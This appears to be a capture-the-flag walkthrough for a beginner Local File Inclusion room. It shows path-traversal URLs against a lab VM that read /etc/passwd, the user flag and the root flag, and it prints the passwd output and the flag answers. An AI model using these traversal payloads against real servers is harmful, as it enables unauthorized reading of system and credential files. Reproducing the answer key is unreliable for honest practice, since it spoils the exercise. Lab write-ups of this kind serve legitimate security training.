# Task 1 Deploy
----

>>This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.
>>If you have any kind of feedback please reach out to me on twitter at 0xmzfr

----

# Task 2 Root It
----

>>If you've deployed the VM then try to find the LFI parameters and get the user and root flag.

>>Contents in the webpage.
```
Home (current)

Hello, world!

Welcome to my blog. This is currently in it's early stage but you can find some articles that I've wrote.

Hacking this world

There are various ways we can hack people and the devices these people depends upon. The best thing is that we don't even have to thing about it twice because bad things happen.

LFI-attack

Local file inclusion attack is the one using which you can include any localfile i.e all the files that are present on the server if the permission is right on the file. The most common file on unix that we can check for is /etc/passwd

RFI-attack

RFI attack or Remote file inclusion attack is the one in which server would include any file from outside the server that means we can include any evil file from our server to the machine and then exploit it.

© falconfeast 2020
```

>>Using the point LFI-attack to include the file.
>>Getting the /etc/passwd.
```url
http://10.10.138.224/article?name=../../../../etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false 
```
>>Getting user.txt
```url
http://10.10.138.224/article?name=../../../../home/falconfeast/user.txt
```
```
60989655118397345799 
```
>>Getting root.txt
```url
http://10.10.138.224/article?name=../../../../root/root.txt
```
```
42964104845495153909
```

----

# ANSWER THE FOLLOWING :
----

1.Deploy the machine and start enumerating
>>No answer needed

2.user flag
>>60989655118397345799

3.root flag    
>>42964104845495153909 

----